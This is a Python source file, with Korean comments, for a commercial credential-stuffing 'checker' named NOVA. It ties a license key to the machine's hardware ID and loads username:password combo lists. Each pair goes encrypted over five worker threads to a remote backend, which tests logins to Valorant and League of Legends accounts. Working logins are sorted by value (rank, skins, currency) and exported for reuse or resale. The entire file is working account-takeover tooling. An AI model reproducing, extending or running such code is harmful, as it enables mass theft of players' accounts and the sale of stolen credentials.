"""NOVA 체킹 엔진 — macOS/크로스플랫폼 (DLL 불필요, 순수 Python)."""
from __future__ import annotations
import hashlib, hmac, json, logging, os, platform, secrets
import subprocess, threading, time, uuid
from concurrent.futures import ThreadPoolExecutor
from typing import Callable, Optional
import requests
import nova_crypto_box as cbox

logger = logging.getLogger('nova')

BACKEND_URL = 'https://hex-vending.xyz'
LICENSE_URL = f'{BACKEND_URL}/api/nova/verify'


def get_hwid() -> str:
    system = platform.system()
    if system == 'Darwin':
        try:
            out = subprocess.check_output(
                ['ioreg', '-rd1', '-c', 'IOPlatformExpertDevice'],
                text=True, timeout=5)
            for line in out.splitlines():
                if 'IOPlatformSerialNumber' in line:
                    serial = line.split('"')[-2]
                    return hashlib.sha256(f'mac|{serial}|{uuid.getnode()}'.encode()).hexdigest()
        except Exception:
            pass
    parts = [str(uuid.getnode()), platform.node(),
             os.environ.get('COMPUTERNAME', ''), os.environ.get('USERNAME', '')]
    return hashlib.sha256('|'.join(parts).encode()).hexdigest()


def _sign_verify_payload(body: dict) -> str:
    raw = '|'.join(f'{k}={body[k]}' for k in sorted(body.keys()))
    hwid = body.get('hwid', '')
    key_mat = f'{hwid}:nova:verify'
    return hmac.new(key_mat.encode(), raw.encode(), hashlib.sha256).hexdigest()


def verify_license(key: str) -> dict:
    key = (key or '').strip().upper()
    import re
    if not re.fullmatch(r'[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}', key):
        return {'valid': False, 'error': '키 형식: XXXX-XXXX-XXXX'}
    hwid = get_hwid()
    ts = int(time.time())
    nonce = secrets.token_hex(8)
    body = {'key': key, 'hwid': hwid, 'ts': ts, 'nonce': nonce,
            'client_hwid_new': hwid, 'client_hwid_legacy': hwid[:32],
            'client_ver': 2}
    body['sig'] = _sign_verify_payload({k: v for k, v in body.items() if k != 'sig'})
    for attempt in range(3):
        try:
            resp = requests.post(LICENSE_URL, json=body, timeout=30,
                                 headers={'User-Agent': 'NOVA/1.0',
                                          'Accept': 'application/json'})
            break
        except Exception as e:
            if attempt == 2:
                return {'valid': False, 'error': f'네트워크 오류: {e}'}
            time.sleep(2)
    try:
        data = resp.json() if 'json' in resp.headers.get('content-type', '') else {}
    except Exception:
        data = {}
    payload = data.get('data', data) if isinstance(data, dict) else data
    if resp.status_code == 200 and isinstance(payload, dict) and payload.get('valid'):
        return payload
    err = ''
    if isinstance(payload, dict):
        err = payload.get('error') or payload.get('message') or ''
    return {'valid': False, 'error': err or f'서버 거부 (HTTP {resp.status_code})'}


class RemoteChecker:
    def __init__(self, license_key: str, signing_secret: str):
        self.server_url = BACKEND_URL
        self.license_key = license_key
        self.signing_secret = signing_secret
        self._sess = requests.Session()
        self._sess.headers['User-Agent'] = 'NOVA/1.0'
        self._lock = threading.Lock()
        self._session_id = ''
        self._session_key = b''
        self._session_exp = 0.0

    def _sign_headers(self, body: bytes, extra: dict = None) -> dict:
        ts = str(int(time.time()))
        nonce = secrets.token_hex(16)
        body_hash = hashlib.sha256(body).hexdigest()
        payload = f'{ts}.{nonce}.{body_hash}'
        sig = hmac.new(self.signing_secret.encode(), payload.encode(),
                       hashlib.sha256).hexdigest()
        h = {'Authorization': f'Bearer {self.license_key}',
             'Content-Type': 'application/json',
             'X-Timestamp': ts, 'X-Nonce': nonce, 'X-Signature': sig}
        if extra: h.update(extra)
        return h

    def _ensure_session(self, timeout: float = 60.0) -> bool:
        with self._lock:
            if self._session_key and time.time() < self._session_exp - 60:
                return True
            priv, pub = cbox.generate_keypair()
            body = json.dumps({'client_pub': cbox.b64e(pub)},
                              separators=(',', ':')).encode()
            headers = self._sign_headers(body)
            try:
                r = self._sess.post(f'{self.server_url}/api/v1/handshake',
                                    data=body, headers=headers, timeout=timeout)
            except Exception as e:
                logger.warning(f'[REMOTE] 핸드셰이크 실패: {e}')
                return False
            if r.status_code != 200:
                logger.warning(f'[REMOTE] 핸드셰이크 거부: HTTP {r.status_code}')
                return False
            try:
                d = r.json()
                server_pub = cbox.b64d(d['server_pub'])
                self._session_id = d['session_id']
                self._session_key = cbox.derive_session_key(
                    priv, server_pub, self.license_key)
                self._session_exp = time.time() + int(d.get('ttl', 3600))
                return True
            except Exception as e:
                logger.warning(f'[REMOTE] 핸드셰이크 파싱 실패: {e}')
                return False

    def check(self, username: str, password: str, mode: str = 'valorant',
              timeout: float = 180.0) -> dict:
        if not self._ensure_session():
            return {'status': 'error', 'msg': '세션 수립 실패'}
        with self._lock:
            sid, skey = self._session_id, self._session_key
        body_dict = {'username': username, 'password': password, 'mode': mode}
        plain = json.dumps(body_dict, separators=(',', ':')).encode()
        enc_nonce, ct = cbox.encrypt(skey, plain)
        headers = self._sign_headers(ct, extra={
            'X-Session-ID': sid, 'X-Enc-Nonce': cbox.b64e(enc_nonce),
            'Content-Type': 'application/octet-stream'})
        try:
            r = self._sess.post(f'{self.server_url}/api/v1/check',
                                data=ct, headers=headers, timeout=timeout)
        except Exception as e:
            return {'status': 'error', 'msg': f'연결 실패: {e}'}
        if r.status_code == 401:
            with self._lock: self._session_key = b''
            if self._ensure_session():
                return self.check(username, password, mode, timeout)
            return {'status': 'error', 'msg': '인증 실패'}
        if r.status_code == 403:
            return {'status': 'error', 'msg': '라이센스 만료/비활성'}
        if r.status_code >= 500:
            return {'status': 'error', 'msg': f'서버 오류 HTTP {r.status_code}'}
        enc_nonce_b64 = r.headers.get('X-Enc-Nonce', '')
        if not enc_nonce_b64:
            try: return r.json()
            except: return {'status': 'error', 'msg': '응답 파싱 실패'}
        try:
            return json.loads(cbox.decrypt(skey, cbox.b64d(enc_nonce_b64), r.content))
        except Exception:
            return {'status': 'error', 'msg': '복호화 실패'}


class CheckerSession:
    """멀티스레드 체킹 세션 관리."""

    def __init__(self, license_key: str, signing_secret: str,
                 on_result: Optional[Callable] = None,
                 on_progress: Optional[Callable] = None):
        self.rc = RemoteChecker(license_key, signing_secret)
        self.on_result = on_result or (lambda *a: None)
        self.on_progress = on_progress or (lambda *a: None)
        self.combos: list[tuple[str, str]] = []
        self.stop_ev = threading.Event()
        self.pause_ev = threading.Event()
        self.pause_ev.set()
        self.stats = {'checked': 0, 'hits': 0, 'bans': 0, 'errors': 0,
                      'invalid': 0, 'twofa': 0, 'free': 0, 'total': 0}
        self.results: dict[str, list] = {
            'hits': [], 'bans': [], 'invalid': [], 'twofa': [],
            'errors': [], 'free': []}
        self._lock = threading.Lock()
        self._running = False
        self.mode = 'valorant'
        self.threads = 5

    def load_combos(self, text: str) -> int:
        self.combos.clear()
        for line in text.strip().splitlines():
            line = line.strip()
            if ':' not in line: continue
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                self.combos.append((parts[0].strip(), parts[1].strip()))
        self.stats['total'] = len(self.combos)
        return len(self.combos)

    def start(self):
        if self._running: return
        self._running = True
        self.stop_ev.clear()
        self.pause_ev.set()
        self.stats.update(checked=0, hits=0, bans=0, errors=0,
                          invalid=0, twofa=0, free=0)
        for v in self.results.values(): v.clear()
        threading.Thread(target=self._run, daemon=True).start()

    def stop(self):
        self.stop_ev.set()
        self.pause_ev.set()

    def pause(self):
        if self.pause_ev.is_set():
            self.pause_ev.clear()
        else:
            self.pause_ev.set()

    @property
    def running(self): return self._running

    @property
    def paused(self): return not self.pause_ev.is_set()

    def _run(self):
        import queue
        q = queue.Queue()
        for c in self.combos: q.put(c)

        def worker():
            while not self.stop_ev.is_set():
                self.pause_ev.wait()
                if self.stop_ev.is_set(): break
                try:
                    u, p = q.get_nowait()
                except queue.Empty:
                    break
                try:
                    result = self.rc.check(u, p, mode=self.mode)
                except Exception as e:
                    result = {'status': 'error', 'msg': str(e)}
                st = (result.get('status') or 'error').lower()
                info = result.get('account_info') or {}
                lol_info = result.get('lol_info')
                if lol_info and isinstance(lol_info, dict):
                    for k, v in lol_info.items():
                        if v not in (None, '', 0, [], {}):
                            info[k] = v
                if info and 'summoner_level' in info and 'summoner_level_lst' not in info:
                    info['summoner_level_lst'] = info['summoner_level']
                entry = {'user': u, 'pass': p, 'status': st, 'info': info,
                         'msg': result.get('msg', '')}
                with self._lock:
                    self.stats['checked'] += 1
                    if st == 'ok':
                        skins = info.get('skins_count', 0) or 0
                        rank = info.get('rank', '')
                        be = info.get('blue_essence', 0) or 0
                        is_free = (not rank or rank.lower() == 'unranked') and skins < 3
                        if is_free:
                            self.stats['free'] += 1
                            self.results['free'].append(entry)
                        else:
                            self.stats['hits'] += 1
                            self.results['hits'].append(entry)
                    elif st == 'banned':
                        self.stats['bans'] += 1
                        self.results['bans'].append(entry)
                    elif st == '2fa':
                        self.stats['twofa'] += 1
                        self.results['twofa'].append(entry)
                    elif st == 'invalid':
                        self.stats['invalid'] += 1
                        self.results['invalid'].append(entry)
                    else:
                        self.stats['errors'] += 1
                        self.results['errors'].append(entry)
                self.on_result(entry)
                self.on_progress(dict(self.stats))

        workers = []
        for i in range(self.threads):
            if self.stop_ev.is_set(): break
            t = threading.Thread(target=worker, daemon=True, name=f'nova-w-{i}')
            t.start()
            workers.append(t)
            time.sleep(0.05)

        for t in workers: t.join()
        self._running = False
        self.on_progress(dict(self.stats))

    def export_results(self, category: str) -> str:
        items = self.results.get(category, [])
        lines = []
        for e in items:
            line = f"{e['user']}:{e['pass']}"
            info = e.get('info', {})
            if info:
                parts = []
                for k in ('rank', 'level', 'skins_count', 'vp',
                          'summoner_level_lst', 'blue_essence', 'champions_count'):
                    v = info.get(k)
                    if v not in (None, '', 0): parts.append(f'{k}={v}')
                if parts: line += ' | ' + ' | '.join(parts)
            lines.append(line)
        return '\n'.join(lines)
